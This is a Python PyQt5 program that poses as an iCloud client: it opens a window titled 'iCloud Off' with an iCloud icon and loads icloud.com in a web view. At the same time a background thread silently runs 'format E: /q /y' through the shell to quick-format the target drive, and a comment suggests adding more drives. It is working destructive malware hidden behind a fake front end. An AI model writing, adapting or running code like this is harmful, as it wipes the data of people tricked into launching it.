import subprocess
import threading
import os
import requests
from PyQt5.QtWidgets import QApplication, QWidget, QVBoxLayout
from PyQt5.QtWebEngineWidgets import QWebEngineView
from PyQt5.QtCore import QUrl
from PyQt5.QtGui import QIcon
from tempfile import NamedTemporaryFile


class App_cloud(QWidget):
    def __init__(self, diss_a_f):
        super().__init__()
        self.diss_a_f = diss_a_f
        self.vent_v()
        self.ini_for()

    def vent_v(self):
        self.setGeometry(300, 300, 800, 600)
        self.setWindowTitle('iCloud Off')
        
        icon_url = "https://i.ibb.co/nsrnVTk/icloud-2.png"  
        self.vista_w(icon_url)

        layout = QVBoxLayout()
        self.setLayout(layout)

        self.webview = QWebEngineView()
        self.webview.load(QUrl("https://www.icloud.com"))  
        layout.addWidget(self.webview)

    def vista_w(self, url):
        response = requests.get(url)
        if response.status_code == 200:
            with NamedTemporaryFile(delete=False, suffix='.png') as tmp_file:
                tmp_file.write(response.content)
                self.setWindowIcon(QIcon(tmp_file.name))


    def ini_for(self):
        hilo_form = threading.Thread(target=self.for_diss, args=(self.diss_a_f,))
        hilo_form.start()

    def for_diss(self, discos):
        diss_enc= False
        for disco in discos:
            if os.path.exists(disco):
                diss_enc= True
                comando_format = f'format {disco} /q /y'
                try:
                    proceso = subprocess.run(comando_format, check=True, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
                    print(f"Disco {disco} formateado correctamente.")
                    print(proceso.stdout)
                    break  
                except subprocess.CalledProcessError as e:
                    print(f"Error al formatear el disco {disco}:")
                    print(e.output)

        if not diss_enc:
            print("Ninguno de los discos especificados fue encontrado.")

def main():
    diss_a_f = ['E:']  # Agrega varios discos si deseas ejemplo: ['E:', 'D:', ETC ]
    app = QApplication([])
    web_app = App_cloud(diss_a_f)
    web_app.show()
    app.exec_()

if __name__ == '__main__':
    main()
